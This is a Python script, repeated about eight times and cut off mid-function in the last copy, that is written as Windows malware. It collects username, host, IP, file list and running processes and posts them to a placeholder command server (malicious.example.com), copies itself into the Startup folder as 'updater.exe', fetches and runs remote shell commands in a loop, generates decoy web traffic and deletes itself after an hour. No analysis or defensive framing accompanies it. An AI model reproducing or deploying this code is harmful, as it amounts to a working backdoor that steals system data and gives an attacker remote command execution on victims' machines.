import os
import sys
import base64
import requests
import subprocess
import platform
import socket
import shutil
import threading
import time
import psutil
import random

def disguise_function():
    encoded = "VGhpcyBpcyBqdXN0IGFuIGV4YW1wbGU="
    decoded = base64.b64decode(encoded).decode("utf-8")
    return decoded

def collect_information():
    try:
        user_data = {
            "user": os.getenv("USERNAME"),
            "system": sys.platform,
            "platform": platform.system(),
            "network_name": os.getenv("COMPUTERNAME"),
            "ip_address": socket.gethostbyname(socket.gethostname()),
            "files": os.listdir(os.getcwd()),
            "active_processes": subprocess.check_output("tasklist", shell=True, text=True),
            "cpu_info": platform.processor(),
            "architecture": platform.architecture(),
            "uptime": subprocess.check_output("wmic os get lastbootuptime", shell=True, text=True).strip(),
            "memory": psutil.virtual_memory()._asdict(),
            "disk_usage": psutil.disk_usage('/')._asdict()
        }
    except Exception as e:
        user_data = {"error": str(e)}
    return user_data

def send_to_command_server(data):
    server_url = "http://malicious.example.com/command"
    headers = {"User-Agent": "Mozilla/5.0"}
    try:
        response = requests.post(server_url, json=data, headers=headers)
        if response.status_code == 200:
            print("Data sent successfully.")
    except Exception as e:
        print(f"Failed to send data: {e}")

def persist_payload():
    script_path = os.path.abspath(__file__)
    startup_folder = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
    try:
        if not os.path.exists(startup_folder):
            os.makedirs(startup_folder)
        new_location = os.path.join(startup_folder, "updater.exe")
        shutil.copyfile(script_path, new_location)
    except Exception as e:
        print(f"Failed to persist payload: {e}")

def monitor_system():
    while True:
        try:
            with open("system_log.txt", "a") as log_file:
                log_file.write(f"Current Time: {time.ctime()}, CPU Usage: {subprocess.check_output(['wmic', 'cpu', 'get', 'loadpercentage'], shell=True, text=True)}\n")
        except Exception as e:
            print(f"Failed to log system data: {e}")
        time.sleep(60)

def execute_commands():
    command_server = "http://malicious.example.com/commands"
    while True:
        try:
            response = requests.get(command_server)
            if response.status_code == 200:
                commands = response.json().get("commands", [])
                for command in commands:
                    try:
                        output = subprocess.check_output(command, shell=True, text=True)
                        print(f"Executed command: {command}\nOutput: {output}")
                    except Exception as cmd_error:
                        print(f"Failed to execute command: {command}, Error: {cmd_error}")
        except Exception as e:
            print(f"Failed to fetch commands: {e}")
        time.sleep(30)

def generate_fake_traffic():
    urls = [
        "http://example.com",
        "http://testsite.com",
        "http://randomsite.com"
    ]
    while True:
        try:
            url = random.choice(urls)
            response = requests.get(url)
            print(f"Visited {url}, Status Code: {response.status_code}")
        except Exception as e:
            print(f"Error generating traffic: {e}")
        time.sleep(random.randint(5, 15))

def self_destruct():
    time.sleep(3600)
    try:
        script_path = os.path.abspath(__file__)
        os.remove(script_path)
        print("Self-destructed.")
    except Exception as e:
        print(f"Failed to self-destruct: {e}")

if __name__ == "__main__":
    persist_payload()
    info = collect_information()
    send_to_command_server(info)
    disguise_function()
    threading.Thread(target=monitor_system, daemon=True).start()
    threading.Thread(target=execute_commands, daemon=True).start()
    threading.Thread(target=generate_fake_traffic, daemon=True).start()
    threading.Thread(target=self_destruct, daemon=True).start()
    while True:
        time.sleep(10)
import os
import sys
import base64
import requests
import subprocess
import platform
import socket
import shutil
import threading
import time
import psutil
import random

def disguise_function():
    encoded = "VGhpcyBpcyBqdXN0IGFuIGV4YW1wbGU="
    decoded = base64.b64decode(encoded).decode("utf-8")
    return decoded

def collect_information():
    try:
        user_data = {
            "user": os.getenv("USERNAME"),
            "system": sys.platform,
            "platform": platform.system(),
            "network_name": os.getenv("COMPUTERNAME"),
            "ip_address": socket.gethostbyname(socket.gethostname()),
            "files": os.listdir(os.getcwd()),
            "active_processes": subprocess.check_output("tasklist", shell=True, text=True),
            "cpu_info": platform.processor(),
            "architecture": platform.architecture(),
            "uptime": subprocess.check_output("wmic os get lastbootuptime", shell=True, text=True).strip(),
            "memory": psutil.virtual_memory()._asdict(),
            "disk_usage": psutil.disk_usage('/')._asdict()
        }
    except Exception as e:
        user_data = {"error": str(e)}
    return user_data

def send_to_command_server(data):
    server_url = "http://malicious.example.com/command"
    headers = {"User-Agent": "Mozilla/5.0"}
    try:
        response = requests.post(server_url, json=data, headers=headers)
        if response.status_code == 200:
            print("Data sent successfully.")
    except Exception as e:
        print(f"Failed to send data: {e}")

def persist_payload():
    script_path = os.path.abspath(__file__)
    startup_folder = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
    try:
        if not os.path.exists(startup_folder):
            os.makedirs(startup_folder)
        new_location = os.path.join(startup_folder, "updater.exe")
        shutil.copyfile(script_path, new_location)
    except Exception as e:
        print(f"Failed to persist payload: {e}")

def monitor_system():
    while True:
        try:
            with open("system_log.txt", "a") as log_file:
                log_file.write(f"Current Time: {time.ctime()}, CPU Usage: {subprocess.check_output(['wmic', 'cpu', 'get', 'loadpercentage'], shell=True, text=True)}\n")
        except Exception as e:
            print(f"Failed to log system data: {e}")
        time.sleep(60)

def execute_commands():
    command_server = "http://malicious.example.com/commands"
    while True:
        try:
            response = requests.get(command_server)
            if response.status_code == 200:
                commands = response.json().get("commands", [])
                for command in commands:
                    try:
                        output = subprocess.check_output(command, shell=True, text=True)
                        print(f"Executed command: {command}\nOutput: {output}")
                    except Exception as cmd_error:
                        print(f"Failed to execute command: {command}, Error: {cmd_error}")
        except Exception as e:
            print(f"Failed to fetch commands: {e}")
        time.sleep(30)

def generate_fake_traffic():
    urls = [
        "http://example.com",
        "http://testsite.com",
        "http://randomsite.com"
    ]
    while True:
        try:
            url = random.choice(urls)
            response = requests.get(url)
            print(f"Visited {url}, Status Code: {response.status_code}")
        except Exception as e:
            print(f"Error generating traffic: {e}")
        time.sleep(random.randint(5, 15))

def self_destruct():
    time.sleep(3600)
    try:
        script_path = os.path.abspath(__file__)
        os.remove(script_path)
        print("Self-destructed.")
    except Exception as e:
        print(f"Failed to self-destruct: {e}")

if __name__ == "__main__":
    persist_payload()
    info = collect_information()
    send_to_command_server(info)
    disguise_function()
    threading.Thread(target=monitor_system, daemon=True).start()
    threading.Thread(target=execute_commands, daemon=True).start()
    threading.Thread(target=generate_fake_traffic, daemon=True).start()
    threading.Thread(target=self_destruct, daemon=True).start()
    while True:
        time.sleep(10)
import os
import sys
import base64
import requests
import subprocess
import platform
import socket
import shutil
import threading
import time
import psutil
import random

def disguise_function():
    encoded = "VGhpcyBpcyBqdXN0IGFuIGV4YW1wbGU="
    decoded = base64.b64decode(encoded).decode("utf-8")
    return decoded

def collect_information():
    try:
        user_data = {
            "user": os.getenv("USERNAME"),
            "system": sys.platform,
            "platform": platform.system(),
            "network_name": os.getenv("COMPUTERNAME"),
            "ip_address": socket.gethostbyname(socket.gethostname()),
            "files": os.listdir(os.getcwd()),
            "active_processes": subprocess.check_output("tasklist", shell=True, text=True),
            "cpu_info": platform.processor(),
            "architecture": platform.architecture(),
            "uptime": subprocess.check_output("wmic os get lastbootuptime", shell=True, text=True).strip(),
            "memory": psutil.virtual_memory()._asdict(),
            "disk_usage": psutil.disk_usage('/')._asdict()
        }
    except Exception as e:
        user_data = {"error": str(e)}
    return user_data

def send_to_command_server(data):
    server_url = "http://malicious.example.com/command"
    headers = {"User-Agent": "Mozilla/5.0"}
    try:
        response = requests.post(server_url, json=data, headers=headers)
        if response.status_code == 200:
            print("Data sent successfully.")
    except Exception as e:
        print(f"Failed to send data: {e}")

def persist_payload():
    script_path = os.path.abspath(__file__)
    startup_folder = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
    try:
        if not os.path.exists(startup_folder):
            os.makedirs(startup_folder)
        new_location = os.path.join(startup_folder, "updater.exe")
        shutil.copyfile(script_path, new_location)
    except Exception as e:
        print(f"Failed to persist payload: {e}")

def monitor_system():
    while True:
        try:
            with open("system_log.txt", "a") as log_file:
                log_file.write(f"Current Time: {time.ctime()}, CPU Usage: {subprocess.check_output(['wmic', 'cpu', 'get', 'loadpercentage'], shell=True, text=True)}\n")
        except Exception as e:
            print(f"Failed to log system data: {e}")
        time.sleep(60)

def execute_commands():
    command_server = "http://malicious.example.com/commands"
    while True:
        try:
            response = requests.get(command_server)
            if response.status_code == 200:
                commands = response.json().get("commands", [])
                for command in commands:
                    try:
                        output = subprocess.check_output(command, shell=True, text=True)
                        print(f"Executed command: {command}\nOutput: {output}")
                    except Exception as cmd_error:
                        print(f"Failed to execute command: {command}, Error: {cmd_error}")
        except Exception as e:
            print(f"Failed to fetch commands: {e}")
        time.sleep(30)

def generate_fake_traffic():
    urls = [
        "http://example.com",
        "http://testsite.com",
        "http://randomsite.com"
    ]
    while True:
        try:
            url = random.choice(urls)
            response = requests.get(url)
            print(f"Visited {url}, Status Code: {response.status_code}")
        except Exception as e:
            print(f"Error generating traffic: {e}")
        time.sleep(random.randint(5, 15))

def self_destruct():
    time.sleep(3600)
    try:
        script_path = os.path.abspath(__file__)
        os.remove(script_path)
        print("Self-destructed.")
    except Exception as e:
        print(f"Failed to self-destruct: {e}")

if __name__ == "__main__":
    persist_payload()
    info = collect_information()
    send_to_command_server(info)
    disguise_function()
    threading.Thread(target=monitor_system, daemon=True).start()
    threading.Thread(target=execute_commands, daemon=True).start()
    threading.Thread(target=generate_fake_traffic, daemon=True).start()
    threading.Thread(target=self_destruct, daemon=True).start()
    while True:
        time.sleep(10)
import os
import sys
import base64
import requests
import subprocess
import platform
import socket
import shutil
import threading
import time
import psutil
import random

def disguise_function():
    encoded = "VGhpcyBpcyBqdXN0IGFuIGV4YW1wbGU="
    decoded = base64.b64decode(encoded).decode("utf-8")
    return decoded

def collect_information():
    try:
        user_data = {
            "user": os.getenv("USERNAME"),
            "system": sys.platform,
            "platform": platform.system(),
            "network_name": os.getenv("COMPUTERNAME"),
            "ip_address": socket.gethostbyname(socket.gethostname()),
            "files": os.listdir(os.getcwd()),
            "active_processes": subprocess.check_output("tasklist", shell=True, text=True),
            "cpu_info": platform.processor(),
            "architecture": platform.architecture(),
            "uptime": subprocess.check_output("wmic os get lastbootuptime", shell=True, text=True).strip(),
            "memory": psutil.virtual_memory()._asdict(),
            "disk_usage": psutil.disk_usage('/')._asdict()
        }
    except Exception as e:
        user_data = {"error": str(e)}
    return user_data

def send_to_command_server(data):
    server_url = "http://malicious.example.com/command"
    headers = {"User-Agent": "Mozilla/5.0"}
    try:
        response = requests.post(server_url, json=data, headers=headers)
        if response.status_code == 200:
            print("Data sent successfully.")
    except Exception as e:
        print(f"Failed to send data: {e}")

def persist_payload():
    script_path = os.path.abspath(__file__)
    startup_folder = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
    try:
        if not os.path.exists(startup_folder):
            os.makedirs(startup_folder)
        new_location = os.path.join(startup_folder, "updater.exe")
        shutil.copyfile(script_path, new_location)
    except Exception as e:
        print(f"Failed to persist payload: {e}")

def monitor_system():
    while True:
        try:
            with open("system_log.txt", "a") as log_file:
                log_file.write(f"Current Time: {time.ctime()}, CPU Usage: {subprocess.check_output(['wmic', 'cpu', 'get', 'loadpercentage'], shell=True, text=True)}\n")
        except Exception as e:
            print(f"Failed to log system data: {e}")
        time.sleep(60)

def execute_commands():
    command_server = "http://malicious.example.com/commands"
    while True:
        try:
            response = requests.get(command_server)
            if response.status_code == 200:
                commands = response.json().get("commands", [])
                for command in commands:
                    try:
                        output = subprocess.check_output(command, shell=True, text=True)
                        print(f"Executed command: {command}\nOutput: {output}")
                    except Exception as cmd_error:
                        print(f"Failed to execute command: {command}, Error: {cmd_error}")
        except Exception as e:
            print(f"Failed to fetch commands: {e}")
        time.sleep(30)

def generate_fake_traffic():
    urls = [
        "http://example.com",
        "http://testsite.com",
        "http://randomsite.com"
    ]
    while True:
        try:
            url = random.choice(urls)
            response = requests.get(url)
            print(f"Visited {url}, Status Code: {response.status_code}")
        except Exception as e:
            print(f"Error generating traffic: {e}")
        time.sleep(random.randint(5, 15))

def self_destruct():
    time.sleep(3600)
    try:
        script_path = os.path.abspath(__file__)
        os.remove(script_path)
        print("Self-destructed.")
    except Exception as e:
        print(f"Failed to self-destruct: {e}")

if __name__ == "__main__":
    persist_payload()
    info = collect_information()
    send_to_command_server(info)
    disguise_function()
    threading.Thread(target=monitor_system, daemon=True).start()
    threading.Thread(target=execute_commands, daemon=True).start()
    threading.Thread(target=generate_fake_traffic, daemon=True).start()
    threading.Thread(target=self_destruct, daemon=True).start()
    while True:
        time.sleep(10)
import os
import sys
import base64
import requests
import subprocess
import platform
import socket
import shutil
import threading
import time
import psutil
import random

def disguise_function():
    encoded = "VGhpcyBpcyBqdXN0IGFuIGV4YW1wbGU="
    decoded = base64.b64decode(encoded).decode("utf-8")
    return decoded

def collect_information():
    try:
        user_data = {
            "user": os.getenv("USERNAME"),
            "system": sys.platform,
            "platform": platform.system(),
            "network_name": os.getenv("COMPUTERNAME"),
            "ip_address": socket.gethostbyname(socket.gethostname()),
            "files": os.listdir(os.getcwd()),
            "active_processes": subprocess.check_output("tasklist", shell=True, text=True),
            "cpu_info": platform.processor(),
            "architecture": platform.architecture(),
            "uptime": subprocess.check_output("wmic os get lastbootuptime", shell=True, text=True).strip(),
            "memory": psutil.virtual_memory()._asdict(),
            "disk_usage": psutil.disk_usage('/')._asdict()
        }
    except Exception as e:
        user_data = {"error": str(e)}
    return user_data

def send_to_command_server(data):
    server_url = "http://malicious.example.com/command"
    headers = {"User-Agent": "Mozilla/5.0"}
    try:
        response = requests.post(server_url, json=data, headers=headers)
        if response.status_code == 200:
            print("Data sent successfully.")
    except Exception as e:
        print(f"Failed to send data: {e}")

def persist_payload():
    script_path = os.path.abspath(__file__)
    startup_folder = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
    try:
        if not os.path.exists(startup_folder):
            os.makedirs(startup_folder)
        new_location = os.path.join(startup_folder, "updater.exe")
        shutil.copyfile(script_path, new_location)
    except Exception as e:
        print(f"Failed to persist payload: {e}")

def monitor_system():
    while True:
        try:
            with open("system_log.txt", "a") as log_file:
                log_file.write(f"Current Time: {time.ctime()}, CPU Usage: {subprocess.check_output(['wmic', 'cpu', 'get', 'loadpercentage'], shell=True, text=True)}\n")
        except Exception as e:
            print(f"Failed to log system data: {e}")
        time.sleep(60)

def execute_commands():
    command_server = "http://malicious.example.com/commands"
    while True:
        try:
            response = requests.get(command_server)
            if response.status_code == 200:
                commands = response.json().get("commands", [])
                for command in commands:
                    try:
                        output = subprocess.check_output(command, shell=True, text=True)
                        print(f"Executed command: {command}\nOutput: {output}")
                    except Exception as cmd_error:
                        print(f"Failed to execute command: {command}, Error: {cmd_error}")
        except Exception as e:
            print(f"Failed to fetch commands: {e}")
        time.sleep(30)

def generate_fake_traffic():
    urls = [
        "http://example.com",
        "http://testsite.com",
        "http://randomsite.com"
    ]
    while True:
        try:
            url = random.choice(urls)
            response = requests.get(url)
            print(f"Visited {url}, Status Code: {response.status_code}")
        except Exception as e:
            print(f"Error generating traffic: {e}")
        time.sleep(random.randint(5, 15))

def self_destruct():
    time.sleep(3600)
    try:
        script_path = os.path.abspath(__file__)
        os.remove(script_path)
        print("Self-destructed.")
    except Exception as e:
        print(f"Failed to self-destruct: {e}")

if __name__ == "__main__":
    persist_payload()
    info = collect_information()
    send_to_command_server(info)
    disguise_function()
    threading.Thread(target=monitor_system, daemon=True).start()
    threading.Thread(target=execute_commands, daemon=True).start()
    threading.Thread(target=generate_fake_traffic, daemon=True).start()
    threading.Thread(target=self_destruct, daemon=True).start()
    while True:
        time.sleep(10)
import os
import sys
import base64
import requests
import subprocess
import platform
import socket
import shutil
import threading
import time
import psutil
import random

def disguise_function():
    encoded = "VGhpcyBpcyBqdXN0IGFuIGV4YW1wbGU="
    decoded = base64.b64decode(encoded).decode("utf-8")
    return decoded

def collect_information():
    try:
        user_data = {
            "user": os.getenv("USERNAME"),
            "system": sys.platform,
            "platform": platform.system(),
            "network_name": os.getenv("COMPUTERNAME"),
            "ip_address": socket.gethostbyname(socket.gethostname()),
            "files": os.listdir(os.getcwd()),
            "active_processes": subprocess.check_output("tasklist", shell=True, text=True),
            "cpu_info": platform.processor(),
            "architecture": platform.architecture(),
            "uptime": subprocess.check_output("wmic os get lastbootuptime", shell=True, text=True).strip(),
            "memory": psutil.virtual_memory()._asdict(),
            "disk_usage": psutil.disk_usage('/')._asdict()
        }
    except Exception as e:
        user_data = {"error": str(e)}
    return user_data

def send_to_command_server(data):
    server_url = "http://malicious.example.com/command"
    headers = {"User-Agent": "Mozilla/5.0"}
    try:
        response = requests.post(server_url, json=data, headers=headers)
        if response.status_code == 200:
            print("Data sent successfully.")
    except Exception as e:
        print(f"Failed to send data: {e}")

def persist_payload():
    script_path = os.path.abspath(__file__)
    startup_folder = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
    try:
        if not os.path.exists(startup_folder):
            os.makedirs(startup_folder)
        new_location = os.path.join(startup_folder, "updater.exe")
        shutil.copyfile(script_path, new_location)
    except Exception as e:
        print(f"Failed to persist payload: {e}")

def monitor_system():
    while True:
        try:
            with open("system_log.txt", "a") as log_file:
                log_file.write(f"Current Time: {time.ctime()}, CPU Usage: {subprocess.check_output(['wmic', 'cpu', 'get', 'loadpercentage'], shell=True, text=True)}\n")
        except Exception as e:
            print(f"Failed to log system data: {e}")
        time.sleep(60)

def execute_commands():
    command_server = "http://malicious.example.com/commands"
    while True:
        try:
            response = requests.get(command_server)
            if response.status_code == 200:
                commands = response.json().get("commands", [])
                for command in commands:
                    try:
                        output = subprocess.check_output(command, shell=True, text=True)
                        print(f"Executed command: {command}\nOutput: {output}")
                    except Exception as cmd_error:
                        print(f"Failed to execute command: {command}, Error: {cmd_error}")
        except Exception as e:
            print(f"Failed to fetch commands: {e}")
        time.sleep(30)

def generate_fake_traffic():
    urls = [
        "http://example.com",
        "http://testsite.com",
        "http://randomsite.com"
    ]
    while True:
        try:
            url = random.choice(urls)
            response = requests.get(url)
            print(f"Visited {url}, Status Code: {response.status_code}")
        except Exception as e:
            print(f"Error generating traffic: {e}")
        time.sleep(random.randint(5, 15))

def self_destruct():
    time.sleep(3600)
    try:
        script_path = os.path.abspath(__file__)
        os.remove(script_path)
        print("Self-destructed.")
    except Exception as e:
        print(f"Failed to self-destruct: {e}")

if __name__ == "__main__":
    persist_payload()
    info = collect_information()
    send_to_command_server(info)
    disguise_function()
    threading.Thread(target=monitor_system, daemon=True).start()
    threading.Thread(target=execute_commands, daemon=True).start()
    threading.Thread(target=generate_fake_traffic, daemon=True).start()
    threading.Thread(target=self_destruct, daemon=True).start()
    while True:
        time.sleep(10)
import os
import sys
import base64
import requests
import subprocess
import platform
import socket
import shutil
import threading
import time
import psutil
import random

def disguise_function():
    encoded = "VGhpcyBpcyBqdXN0IGFuIGV4YW1wbGU="
    decoded = base64.b64decode(encoded).decode("utf-8")
    return decoded

def collect_information():
    try:
        user_data = {
            "user": os.getenv("USERNAME"),
            "system": sys.platform,
            "platform": platform.system(),
            "network_name": os.getenv("COMPUTERNAME"),
            "ip_address": socket.gethostbyname(socket.gethostname()),
            "files": os.listdir(os.getcwd()),
            "active_processes": subprocess.check_output("tasklist", shell=True, text=True),
            "cpu_info": platform.processor(),
            "architecture": platform.architecture(),
            "uptime": subprocess.check_output("wmic os get lastbootuptime", shell=True, text=True).strip(),
            "memory": psutil.virtual_memory()._asdict(),
            "disk_usage": psutil.disk_usage('/')._asdict()
        }
    except Exception as e:
        user_data = {"error": str(e)}
    return user_data

def send_to_command_server(data):
    server_url = "http://malicious.example.com/command"
    headers = {"User-Agent": "Mozilla/5.0"}
    try:
        response = requests.post(server_url, json=data, headers=headers)
        if response.status_code == 200:
            print("Data sent successfully.")
    except Exception as e:
        print(f"Failed to send data: {e}")

def persist_payload():
    script_path = os.path.abspath(__file__)
    startup_folder = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
    try:
        if not os.path.exists(startup_folder):
            os.makedirs(startup_folder)
        new_location = os.path.join(startup_folder, "updater.exe")
        shutil.copyfile(script_path, new_location)
    except Exception as e:
        print(f"Failed to persist payload: {e}")

def monitor_system():
    while True:
        try:
            with open("system_log.txt", "a") as log_file:
                log_file.write(f"Current Time: {time.ctime()}, CPU Usage: {subprocess.check_output(['wmic', 'cpu', 'get', 'loadpercentage'], shell=True, text=True)}\n")
        except Exception as e:
            print(f"Failed to log system data: {e}")
        time.sleep(60)

def execute_commands():
    command_server = "http://malicious.example.com/commands"
    while True:
        try:
            response = requests.get(command_server)
            if response.status_code == 200:
                commands = response.json().get("commands", [])
                for command in commands:
                    try:
                        output = subprocess.check_output(command, shell=True, text=True)
                        print(f"Executed command: {command}\nOutput: {output}")
                    except Exception as cmd_error:
                        print(f"Failed to execute command: {command}, Error: {cmd_error}")
        except Exception as e:
            print(f"Failed to fetch commands: {e}")
        time.sleep(30)

def generate_fake_traffic():
    urls = [
        "http://example.com",
        "http://testsite.com",
        "http://randomsite.com"
    ]
    while True:
        try:
            url = random.choice(urls)
            response = requests.get(url)
            print(f"Visited {url}, Status Code: {response.status_code}")
        except Exception as e:
            print(f"Error generating traffic: {e}")
        time.sleep(random.randint(5, 15))

def self_destruct():
    time.sleep(3600)
    try:
        script_path = os.path.abspath(__file__)
        os.remove(script_path)
        print("Self-destructed.")
    except Exception as e:
        print(f"Failed to self-destruct: {e}")

if __name__ == "__main__":
    persist_payload()
    info = collect_information()
    send_to_command_server(info)
    disguise_function()
    threading.Thread(target=monitor_system, daemon=True).start()
    threading.Thread(target=execute_commands, daemon=True).start()
    threading.Thread(target=generate_fake_traffic, daemon=True).start()
    threading.Thread(target=self_destruct, daemon=True).start()
    while True:
        time.sleep(10)
import os
import sys
import base64
import requests
import subprocess
import platform
import socket
import shutil
import threading
import time
import psutil
import random

def disguise_function():
    encoded = "VGhpcyBpcyBqdXN0IGFuIGV4YW1wbGU="
    decoded = base64.b64decode(encoded).decode("utf-8")
    return decoded

def collect_information():
    try:
        user_data = {
            "user": os.getenv("USERNAME"),
            "system": sys.platform,
            "platform": platform.system(),
            "network_name": os.getenv("COMPUTERNAME"),
            "ip_address": socket.gethostbyname(socket.gethostname()),
            "files": os.listdir(os.getcwd()),
            "active_processes": subprocess.check_output("tasklist", shell=True, text=True),
            "cpu_info": platform.processor(),
            "architecture": platform.architecture(),
            "uptime": subprocess.check_output("wmic os get lastbootuptime", shell=True, text=True).strip(),
            "memory": psutil.virtual_memory()._asdict(),
            "disk_usage": psutil.disk_usage('/')._asdict()
        }
    except Exception as e:
        user_data = {"error": str(e)}
    return user_data

def send_to_command_server(data):
    server_url = "http://malicious.example.com/command"
    headers = {"User-Agent": "Mozilla/5.0"}
    try:
        response = requests.post(server_url, json=data, headers=headers)
        if response.status_code == 200:
            print("Data sent successfully.")
    except Exception as e:
        print(f"Failed to send data: {e}")

def persist_payload():
    script_path = os.path.abspath(__file__)
    startup_folder = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
    try:
        if not os.path.exists(startup_folder):
            os.makedirs(startup_folder)
        new_location = os.path.join(startup_folder, "updater.exe")
        shutil.copyfile(script_path, new_location)
    except Exception as e:
        print(f"Failed to persist payload: {e}")

def monitor_system():
    while True:
        try:
            with open("system_log.txt", "a") as log_file:
                log_file.write(f"Current Time: {time.ctime()}, CPU Usage: {subprocess.check_output(['wmic', 'cpu', 'get', 'loadpercentage'], shell=True, text=True)}\n")
        except Exception as e:
            print(f"Failed to log system data: {e}")
        time.sleep(60)

def execute_commands():
    command_server = "http://malicious.example.com/commands"
    while True:
        try:
            response = requests.get(command_server)
            if response.status_code == 200:
                commands = response.json().get("commands", [])
                for command in commands:
                    try:
                        output = subprocess.check_output(command, shell=True, text=True)
                        print(f"Executed command: {command}\nOutput: {output}")
                    except Exception as cmd_error:
                        print(f"Failed to execute command: {command}, Error: {cmd_error}")
        except Exception as e:
            print(f"Failed to fetch commands: {e}")
        time.sleep(30)

def generate_fake_traffic():
    urls = [
        "http://example.com",
        "http://testsite.com",
        "http://randomsite.com"
    ]
    while True:
        try:
            url = random.choice(urls)
            response = requests.get(url)
            print(f"Visited {url}, Status Code: {response.status_code}")
        except Exception as e:
            print(f"Error generating traffic: {e}")
        time.sleep(random.randint(5, 15))

def self_destruct():
    time.sleep(3600)
    try:
        script_path = os.path.abspath(__file__)
        os.remove(script_path)
        print("Self-destructed.")
    except Exception as e:
        print(f"Failed to self-destruct: {e}")

if __name__ == "__main__":
    persist_payload()
    info = collect_information()
    send_to_command_server(info)
    disguise_function()
    threading.Thread(target=monitor_system, daemon=True).start()
    threading.Thread(target=execute_commands, daemon=True).start()
    threading.Thread(target=generate_fake_traffic, daemon=True).start()
    threading.Thread(target=self_destruct, daemon=True).start()
    while True:
        time.sleep(10)
import os
import sys
import base64
import requests
import subprocess
import platform
import socket
import shutil
import threading
import time
import psutil
import random

def disguise_function():
    encoded = "VGhpcyBpcyBqdXN0IGFuIGV4YW1wbGU="
    decoded = base64.b64decode(encoded).decode("utf-8")
    return decoded

def collect_information():
    try:
        user_data = {
            "user": os.getenv("USERNAME"),
            "system": sys.platform,
            "platform": platform.system(),
            "network_name": os.getenv("COMPUTERNAME"),
            "ip_address": socket.gethostbyname(socket.gethostname()),
            "files": os.listdir(os.getcwd()),
            "active_processes": subprocess.check_output("tasklist", shell=True, text=True),
            "cpu_info": platform.processor(),
            "architecture": platform.architecture(),
            "uptime": subprocess.check_output("wmic os get lastbootuptime", shell=True, text=True).strip(),
            "memory": psutil.virtual_memory()._asdict(),
            "disk_usage": psutil.disk_usage('/')._asdict()
        }
    except Exception as e:
        user_data = {"error": str(e)}
    return user_data

def send_to_command_server(data):
    server_url = "http://malicious.example.com/command"
    headers = {"User-Agent": "Mozilla/5.0"}
    try:
        response = requests.post(server_url, json=data, headers=headers)
        if response.status_code == 200:
            print("Data sent successfully.")
    except Exception as e:
        print(f"Failed to send data: {e}")

def persist_payload():
    script_path = os.path.abspath(__file__)
    startup_folder = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
    try:
        if not os.path.exists(startup_folder):
            os.makedirs(startup_folder)
        new_location = os.path.join(startup_folder, "updater.exe")
        shutil.copyfile(script_path, new_location)
    except Exception as e:
        print(f"Failed to persist payload: {e}")

def monitor_system():
    while True:
        try:
            with open("system_log.txt", "a") as log_file:
                log_file.write(f"Current Time: {time.ctime()}, CPU Usage: {subprocess.check_output(['wmic', 'cpu', 'get', 'loadpercentage'], shell=True, text=True)}\n")
        except Exception as e:
            print(f"Failed to log system data: {e}")
        time.sleep(60)

def execute_commands():
    command_server = "http://malicious.example.com/commands"
    while True:
        try:
            response = requests.get(command_server)
            if response.status_code == 200:
                commands = response.json().get("commands", [])
                for command in commands:
                    try:
                        output = subprocess.check_output(command, shell=True, text=True)
                        print(f"Executed command: {command}\nOutput: {output}")
                    except Exception as cmd_error:
                        print(f"Failed to execute command: {command}, Error: {cmd_error}")
        except Exception as e:
            print(f"Failed to fetch commands: {e}")
        time.sleep(30)

def generate_fake_traffic():
    urls = [
        "http://example.com",
        "http://testsite.com",
        "http://randomsite.com"
    ]
    while True:
        try:
            url = random.choice(urls)
            response = requests.get(url)
            print(f"Visited {url}, Status Code: {response.status_code}")
        except Exception as e:
            print(f"Error generating traffic: {e}")
        time.sleep(random.randint(5, 15))

def self_destruct():
    time.sleep(3600)
    try:
        script_path = os.path.abspath(__file__)
        os.remove(script_path)
        print("Self-destructed.")
    except Exception as e:
        print(f"Failed to self-destruct: {e}")

if __name__ == "__main__":
    persist_payload()
    info = collect_information()
    send_to_command_server(info)
    disguise_function()
    threading.Thread(target=monitor_system, daemon=True).start()
    threading.Thread(target=execute_commands, daemon=True).start()
    threading.Thread(target=generate_fake_traffic, daemon=True).start()
    threading.Thread(target=self_destruct, daemon=True).start()
    while True:
        time.sleep(10)
import os
import sys
import base64
import requests
import subprocess
import platform
import socket
import shutil
import threading
import time
import psutil
import random

def disguise_function():
    encoded = "VGhpcyBpcyBqdXN0IGFuIGV4YW1wbGU="
    decoded = base64.b64decode(encoded).decode("utf-8")
    return decoded

def collect_information():
    try:
        user_data = {
            "user": os.getenv("USERNAME"),
            "system": sys.platform,
            "platform": platform.system(),
            "network_name": os.getenv("COMPUTERNAME"),
            "ip_address": socket.gethostbyname(socket.gethostname()),
            "files": os.listdir(os.getcwd()),
            "active_processes": subprocess.check_output("tasklist", shell=True, text=True),
            "cpu_info": platform.processor(),
            "architecture": platform.architecture(),
            "uptime": subprocess.check_output("wmic os get lastbootuptime", shell=True, text=True).strip(),
            "memory": psutil.virtual_memory()._asdict(),
            "disk_usage": psutil.disk_usage('/')._asdict()
        }
    except Exception as e:
        user_data = {"error": str(e)}
    return user_data

def send_to_command_server(data):
    server_url = "http://malicious.example.com/command"
    headers = {"User-Agent": "Mozilla/5.0"}
    try:
        response = requests.post(server_url, json=data, headers=headers)
        if response.status_code == 200:
            print("Data sent successfully.")
    except Exception as e:
        print(f"Failed to send data: {e}")

def persist_payload():
    script_path = os.path.abspath(__file__)
    startup_folder = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
    try:
        if not os.path.exists(startup_folder):
            os.makedirs(startup_folder)
        new_location = os.path.join(startup_folder, "updater.exe")
        shutil.copyfile(script_path, new_location)
    except Exception as e:
        print(f"Failed to persist payload: {e}")

def monitor_system():
    while True:
        try:
            with open("system_log.txt", "a") as log_file:
                log_file.write(f"Current Time: {time.ctime()}, CPU Usage: {subprocess.check_output(['wmic', 'cpu', 'get', 'loadpercentage'], shell=True, text=True)}\n")
        except Exception as e:
            print(f"Failed to log system data: {e}")
        time.sleep(60)

def execute_commands():
